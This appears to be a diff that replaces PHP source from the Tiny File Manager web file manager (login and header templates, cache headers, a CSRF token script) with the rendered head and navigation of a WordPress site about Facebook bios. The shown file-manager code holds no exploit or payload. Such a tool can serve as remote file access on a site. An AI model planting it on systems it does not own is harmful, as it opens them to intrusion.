.kadence-column76_6e5e1e-52:not(.specificity){margin-bottom:35px;}@media all and (max-width: 1024px){.kadence-column76_6e5e1e-52 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_6e5e1e-52 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4, .wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"]{padding-left:10px;font-size:var(--global-kb-font-size-md, 1.25rem);border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"]{display:flex;gap:0.25em;align-items:center;}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"] .kb-adv-heading-icon svg{width:1em;height:1em;}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"] .kb-adv-heading-icon{color:var(--global-palette2, #2B6CB0);}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"]:hover .kb-adv-heading-icon{color:var(--global-palette2, #2B6CB0);}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 1024px){.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4, .wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4, .wp-block-kadence-advancedheading.kt-adv-heading76_a0236b-a4[data-kb-block="kb-adv-heading76_a0236b-a4"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}.kadence-column76_1a5aa0-78 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);}.kadence-column76_1a5aa0-78 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_1a5aa0-78 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_1a5aa0-78 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_1a5aa0-78 > .kt-inside-inner-col{background-color:#ececec;}@media all and (max-width: 1024px){.kadence-column76_1a5aa0-78 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_1a5aa0-78 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2, .wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"]{padding-left:10px;font-size:var(--global-kb-font-size-md, 1.25rem);border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"]{display:flex;gap:0.25em;align-items:center;}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"] .kb-adv-heading-icon svg{width:1em;height:1em;}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"] .kb-adv-heading-icon{color:var(--global-palette2, #2B6CB0);}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"]:hover .kb-adv-heading-icon{color:var(--global-palette2, #2B6CB0);}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 1024px){.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2, .wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2, .wp-block-kadence-advancedheading.kt-adv-heading76_6898fc-c2[data-kb-block="kb-adv-heading76_6898fc-c2"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}.kadence-column76_b2be38-6e > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);}.kadence-column76_b2be38-6e > .kt-inside-inner-col,.kadence-column76_b2be38-6e > .kt-inside-inner-col:before{border-top-left-radius:0px;border-top-right-radius:0px;border-bottom-right-radius:0px;border-bottom-left-radius:30px;}.kadence-column76_b2be38-6e > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b2be38-6e > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b2be38-6e > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b2be38-6e, .kt-inside-inner-col > .kadence-column76_b2be38-6e:not(.specificity){margin-top:35px;margin-bottom:35px;}@media all and (max-width: 1024px){.kadence-column76_b2be38-6e > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b2be38-6e > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}.kadence-column76_5e7d03-c8 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);}.kadence-column76_5e7d03-c8 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_5e7d03-c8 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_5e7d03-c8 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_5e7d03-c8 > .kt-inside-inner-col{background-color:#ececec;}.kadence-column76_5e7d03-c8, .kt-inside-inner-col > .kadence-column76_5e7d03-c8:not(.specificity){margin-bottom:35px;}@media all and (max-width: 1024px){.kadence-column76_5e7d03-c8 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_5e7d03-c8 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69, .wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"]{padding-left:10px;font-size:var(--global-kb-font-size-md, 1.25rem);border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"]{display:flex;gap:0.25em;align-items:center;}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"] .kb-adv-heading-icon svg{width:1em;height:1em;}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"] .kb-adv-heading-icon{color:var(--global-palette2, #2B6CB0);}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"]:hover .kb-adv-heading-icon{color:var(--global-palette2, #2B6CB0);}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 1024px){.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69, .wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69, .wp-block-kadence-advancedheading.kt-adv-heading76_bea496-69[data-kb-block="kb-adv-heading76_bea496-69"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}.kt-accordion-id76_1aa1c3-cc .kt-accordion-inner-wrap{row-gap:10px;}.kt-accordion-id76_1aa1c3-cc .kt-accordion-panel-inner{border-top:0px solid transparent;border-right:0px solid transparent;border-bottom:0px solid transparent;border-left:0px solid transparent;background:#ffffff;}.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header{border-top:6px double var(--global-palette9, #ffffff);border-right:6px double var(--global-palette9, #ffffff);border-bottom:6px double var(--global-palette9, #ffffff);border-left:6px double var(--global-palette9, #ffffff);border-top-left-radius:6px;border-top-right-radius:6px;border-bottom-right-radius:6px;border-bottom-left-radius:6px;background:#ececec;color:#0c0c0c;padding-top:14px;padding-right:16px;padding-bottom:14px;padding-left:16px;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle )  > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap .kt-blocks-accordion-icon-trigger:after, .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle )  > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap .kt-blocks-accordion-icon-trigger:before{background:#0c0c0c;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-blocks-accordion-icon-trigger{background:#0c0c0c;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-blocks-accordion-icon-trigger:after, .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-blocks-accordion-icon-trigger:before{background:#ececec;}.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header:hover, 
+				body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc .kt-blocks-accordion-header:focus-visible{color:#444444;background:#eeeeee;border-top-color:#eeeeee;border-top-style:solid;border-right-color:#eeeeee;border-right-style:solid;border-bottom-color:#eeeeee;border-bottom-style:solid;border-left-color:#eeeeee;border-left-style:solid;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle ) .kt-accordion-header-wrap .kt-blocks-accordion-header:hover .kt-blocks-accordion-icon-trigger:after, .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle ) .kt-accordion-header-wrap .kt-blocks-accordion-header:hover .kt-blocks-accordion-icon-trigger:before, body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle ) .kt-blocks-accordion--visible .kt-blocks-accordion-icon-trigger:after, body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle ) .kt-blocks-accordion-header:focus-visible .kt-blocks-accordion-icon-trigger:before{background:#444444;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-accordion-header-wrap .kt-blocks-accordion-header:hover .kt-blocks-accordion-icon-trigger, body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-accordion-header-wrap .kt-blocks-accordion-header:focus-visible .kt-blocks-accordion-icon-trigger{background:#444444;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-accordion-header-wrap .kt-blocks-accordion-header:hover .kt-blocks-accordion-icon-trigger:after, .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-accordion-header-wrap .kt-blocks-accordion-header:hover .kt-blocks-accordion-icon-trigger:before, body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-accordion-header-wrap .kt-blocks-accordion-header:focus-visible .kt-blocks-accordion-icon-trigger:after, body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-accordion-header-wrap .kt-blocks-accordion-header:focus-visible .kt-blocks-accordion-icon-trigger:before{background:#eeeeee;}.kt-accordion-id76_1aa1c3-cc .kt-accordion-header-wrap .kt-blocks-accordion-header:focus-visible,
+				.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header.kt-accordion-panel-active{color:#ffffff;background:var(--global-palette2, #2B6CB0);border-top-color:#ffffff;border-top-style:double;border-right-color:#ffffff;border-right-style:double;border-bottom-color:#ffffff;border-bottom-style:double;border-left-color:#ffffff;border-left-style:double;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle )  > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header.kt-accordion-panel-active .kt-blocks-accordion-icon-trigger:after, .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basiccircle ):not( .kt-accodion-icon-style-xclosecircle ):not( .kt-accodion-icon-style-arrowcircle )  > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header.kt-accordion-panel-active .kt-blocks-accordion-icon-trigger:before{background:#ffffff;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-blocks-accordion-header.kt-accordion-panel-active .kt-blocks-accordion-icon-trigger{background:#ffffff;}.kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-blocks-accordion-header.kt-accordion-panel-active .kt-blocks-accordion-icon-trigger:after, .kt-accordion-id76_1aa1c3-cc:not( .kt-accodion-icon-style-basic ):not( .kt-accodion-icon-style-xclose ):not( .kt-accodion-icon-style-arrow ) .kt-blocks-accordion-header.kt-accordion-panel-active .kt-blocks-accordion-icon-trigger:before{background:var(--global-palette2, #2B6CB0);}@media all and (max-width: 1024px){.kt-accordion-id76_1aa1c3-cc .kt-accordion-panel-inner{border-top:0px solid transparent;border-right:0px solid transparent;border-bottom:0px solid transparent;border-left:0px solid transparent;}}@media all and (max-width: 1024px){.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header{border-top:6px double var(--global-palette9, #ffffff);border-right:6px double var(--global-palette9, #ffffff);border-bottom:6px double var(--global-palette9, #ffffff);border-left:6px double var(--global-palette9, #ffffff);}}@media all and (max-width: 1024px){.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header:hover, 
+				body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc .kt-blocks-accordion-header:focus-visible{border-top-color:#eeeeee;border-top-style:solid;border-right-color:#eeeeee;border-right-style:solid;border-bottom-color:#eeeeee;border-bottom-style:solid;border-left-color:#eeeeee;border-left-style:solid;}}@media all and (max-width: 1024px){.kt-accordion-id76_1aa1c3-cc .kt-accordion-header-wrap .kt-blocks-accordion-header:focus-visible,
+				.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header.kt-accordion-panel-active{border-top-color:#ffffff;border-top-style:double;border-right-color:#ffffff;border-right-style:double;border-bottom-color:#ffffff;border-bottom-style:double;border-left-color:#ffffff;border-left-style:double;}}@media all and (max-width: 767px){.kt-accordion-id76_1aa1c3-cc .kt-accordion-panel-inner{border-top:0px solid transparent;border-right:0px solid transparent;border-bottom:0px solid transparent;border-left:0px solid transparent;}.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header{border-top:6px double var(--global-palette9, #ffffff);border-right:6px double var(--global-palette9, #ffffff);border-bottom:6px double var(--global-palette9, #ffffff);border-left:6px double var(--global-palette9, #ffffff);}.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header:hover, 
+				body:not(.hide-focus-outline) .kt-accordion-id76_1aa1c3-cc .kt-blocks-accordion-header:focus-visible{border-top-color:#eeeeee;border-top-style:solid;border-right-color:#eeeeee;border-right-style:solid;border-bottom-color:#eeeeee;border-bottom-style:solid;border-left-color:#eeeeee;border-left-style:solid;}.kt-accordion-id76_1aa1c3-cc .kt-accordion-header-wrap .kt-blocks-accordion-header:focus-visible,
+				.kt-accordion-id76_1aa1c3-cc > .kt-accordion-inner-wrap > .wp-block-kadence-pane > .kt-accordion-header-wrap > .kt-blocks-accordion-header.kt-accordion-panel-active{border-top-color:#ffffff;border-top-style:double;border-right-color:#ffffff;border-right-style:double;border-bottom-color:#ffffff;border-bottom-style:double;border-left-color:#ffffff;border-left-style:double;}}
+/*# sourceURL=kadence_blocks_css-inline-css */
+</style>
+<script src="https://socialfunda.net/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://socialfunda.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="https://socialfunda.net/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://socialfunda.net/wp-json/wp/v2/posts/76" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://socialfunda.net/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.9.4" />
+<link rel='shortlink' href='https://socialfunda.net/?p=76' />
+<meta name="generator" content="Site Kit by Google 1.173.0" /><link rel="pingback" href="https://socialfunda.net/xmlrpc.php"><script type="application/ld+json" class="kadence-faq-schema-graph kadence-faq-schema-graph--kb-faq76_1aa1c3-cc">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name": "Why is a stylish Facebook bio important?","acceptedAnswer":{"@type": "Answer","text": "<p>A stylish Facebook bio can make your profile stand out and leave a good impression on others. It can also help express your personality and interests.</p>"}},{"@type":"Question","name": "How can I make my Facebook bio stylish?","acceptedAnswer":{"@type": "Answer","text": "<p>You can make your Facebook bio stylish by using creative language, including emojis, and highlighting your unique qualities</p>"}},{"@type":"Question","name": "What should I include in my Facebook bio?","acceptedAnswer":{"@type": "Answer","text": "<p>You should include your name, any relevant information about yourself (e.g. your job or interests), and anything else that you feel represents you.</p>"}},{"@type":"Question","name": "Should I use emojis in my Facebook bio?","acceptedAnswer":{"@type": "Answer","text": "<p>Using emojis can add a fun and playful element to your Facebook bio, but it is important to use them sparingly and appropriately.</p>"}},{"@type":"Question","name": "Can I change my Facebook bio?","acceptedAnswer":{"@type": "Answer","text": "<p>Yes, you can change your Facebook bio at any time by editing your profile.</p>"}}]}</script><link rel="icon" href="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-1-32x32.webp" sizes="32x32" />
+<link rel="icon" href="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-1-192x192.webp" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-1-180x180.webp" />
+<meta name="msapplication-TileImage" content="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-1-270x270.webp" />
 </head>
-<body class="fm-login-page <?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?>">
-<div id="wrapper" class="container-fluid">
 
-    <?php
-    }
-
-    /**
-     * Show page footer in Login Form
-     */
-    function fm_show_footer_login()
-    {
-    ?>
+<body class="wp-singular post-template-default single single-post postid-76 single-format-standard wp-custom-logo wp-embed-responsive wp-theme-kadence footer-on-bottom hide-focus-outline link-style-standard has-sidebar has-sticky-sidebar content-title-style-hide content-width-normal content-style-boxed content-vertical-padding-show non-transparent-header mobile-non-transparent-header">
+<div id="wrapper" class="site wp-site-blocks">
+			<a class="skip-link screen-reader-text scroll-ignore" href="#main">Skip to content</a>
+		<header id="masthead" class="site-header" role="banner" itemtype="https://schema.org/WPHeader" itemscope>
+	<div id="main-header" class="site-header-wrap">
+		<div class="site-header-inner-wrap kadence-sticky-header" data-reveal-scroll-up="false" data-shrink="true" data-shrink-height="60">
+			<div class="site-header-upper-wrap">
+				<div class="site-header-upper-inner-wrap">
+					<div class="site-main-header-wrap site-header-row-container site-header-focus-item site-header-row-layout-standard" data-section="kadence_customizer_header_main">
+	<div class="site-header-row-container-inner">
+				<div class="site-container">
+			<div class="site-main-header-inner-wrap site-header-row site-header-row-has-sides site-header-row-no-center">
+									<div class="site-header-main-section-left site-header-section site-header-section-left">
+						<div class="site-header-item site-header-focus-item" data-section="title_tagline">
+	<div class="site-branding branding-layout-standard site-brand-logo-only"><a class="brand has-logo-image" href="https://socialfunda.net/" rel="home" data-wpel-link="internal"><img width="319" height="116" src="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp" class="custom-logo" alt="Social Funda" decoding="async" srcset="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp 319w, https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3-300x109.webp 300w" sizes="(max-width: 319px) 100vw, 319px" /></a></div></div><!-- data-section="title_tagline" -->
+					</div>
+																	<div class="site-header-main-section-right site-header-section site-header-section-right">
+						<div class="site-header-item site-header-focus-item site-header-item-main-navigation header-navigation-layout-stretch-false header-navigation-layout-fill-stretch-false" data-section="kadence_customizer_primary_navigation">
+		<nav id="site-navigation" class="main-navigation header-navigation nav--toggle-sub header-navigation-style-underline header-navigation-dropdown-animation-none" role="navigation" aria-label="Primary Navigation">
+				<div class="primary-menu-container header-menu-container">
+			<ul id="primary-menu" class="menu"><li id="menu-item-768" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-768"><a href="https://socialfunda.net/" data-wpel-link="internal">Home</a></li>
+<li id="menu-item-30" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-30"><a href="https://socialfunda.net/facebook-bios/" data-wpel-link="internal">Facebook Bios</a></li>
+<li id="menu-item-970" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-970"><a href="https://socialfunda.net/insta-bios/" data-wpel-link="internal">Insta Bios</a></li>
+<li id="menu-item-1627" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1627"><a href="https://socialfunda.net/insta-captions/" data-wpel-link="internal">Insta Captions</a></li>
+<li id="menu-item-3584" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3584"><a href="https://socialfunda.net/shayari/" data-wpel-link="internal">Shayari</a></li>
+<li id="menu-item-3585" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3585"><a href="https://socialfunda.net/quotes/" data-wpel-link="internal">Quotes</a></li>
+<li id="menu-item-6836" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6836"><a href="https://socialfunda.net/how-to/" data-wpel-link="internal">How To</a></li>
+<li id="menu-item-5117" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5117"><a href="https://socialfunda.net/about-us/" data-wpel-link="internal">About Us</a></li>
+<li id="menu-item-5115" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5115"><a href="https://socialfunda.net/contact-us/" data-wpel-link="internal">Contact Us</a></li>
+<li id="menu-item-5116" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5116"><a href="https://socialfunda.net/privacy-policy/" data-wpel-link="internal">Privacy Policy</a></li>
+</ul>		</div>
+	</nav><!-- #site-navigation -->
+	</div><!-- data-section="primary_navigation" -->
+<div class="site-header-item site-header-focus-item" data-section="kadence_customizer_header_search">
+		<div class="search-toggle-open-container">
+						<button class="search-toggle-open drawer-toggle search-toggle-style-bordered" aria-label="View Search Form" data-toggle-target="#search-drawer" data-toggle-body-class="showing-popup-drawer-from-full" aria-expanded="false" data-set-focus="#search-drawer .search-field"
+					>
+						<span class="search-toggle-icon"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-search-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="26" height="28" viewBox="0 0 26 28"><title>Search</title><path d="M18 13c0-3.859-3.141-7-7-7s-7 3.141-7 7 3.141 7 7 7 7-3.141 7-7zM26 26c0 1.094-0.906 2-2 2-0.531 0-1.047-0.219-1.406-0.594l-5.359-5.344c-1.828 1.266-4.016 1.937-6.234 1.937-6.078 0-11-4.922-11-11s4.922-11 11-11 11 4.922 11 11c0 2.219-0.672 4.406-1.937 6.234l5.359 5.359c0.359 0.359 0.578 0.875 0.578 1.406z"></path>
+				</svg></span></span>
+		</button>
+	</div>
+	</div><!-- data-section="header_search" -->
+					</div>
+							</div>
+		</div>
+	</div>
 </div>
-<?php print_external('js-jquery'); ?>
-<?php print_external('js-bootstrap'); ?>
-</body>
-</html>
-<?php
-}
-
-/**
- * Show Header after login
- */
-function fm_show_header()
-{
-$sprites_ver = '20160315';
-header("Content-Type: text/html; charset=utf-8");
-header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
-header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
-header("Pragma: no-cache");
-
-global $lang, $root_url, $sticky_navbar, $favicon_path;
-$isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
-    <meta name="author" content="CCP Programmers">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="googlebot" content="noindex">
-    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
-    <title><?php echo fm_enc(APP_TITLE) ?></title>
-    <?php print_external('pre-jsdelivr'); ?>
-    <?php print_external('pre-cloudflare'); ?>
-    <?php print_external('css-bootstrap'); ?>
-    <?php print_external('css-font-awesome'); ?>
-    <?php if (FM_USE_HIGHLIGHTJS && isset($_GET['view'])): ?>
-    <?php print_external('css-highlightjs'); ?>
-    <?php endif; ?>
-    <script type="text/javascript">window.csrf = '<?php echo $_SESSION['token']; ?>';</script>
-    <style>
-        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
-        *,*::before,*::after { box-sizing: border-box;}
-        body { font-size:15px; color:#222;background:#F7F7F7; }
-        body.navbar-fixed { margin-top:55px; }
